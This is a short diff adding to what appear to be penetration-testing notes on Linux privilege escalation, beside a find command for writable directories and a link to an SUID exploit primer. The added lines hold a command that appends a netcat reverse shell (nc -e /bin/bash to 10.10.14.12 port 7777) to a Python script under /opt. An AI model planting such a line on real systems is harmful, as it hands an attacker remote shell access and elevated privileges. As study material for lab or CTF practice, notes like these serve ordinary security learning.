@@ -60,4 +60,10 @@ find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
 
 https://fuzzmymind.com/2019/05/29/suid-binary-exploit-a-primer/
 
+**& modify file content 
+
+```
+echo "os.system('/bin/nc -e /bin/bash 10.10.14.12 7777')" >> /opt/tmp.py
+```
+
 
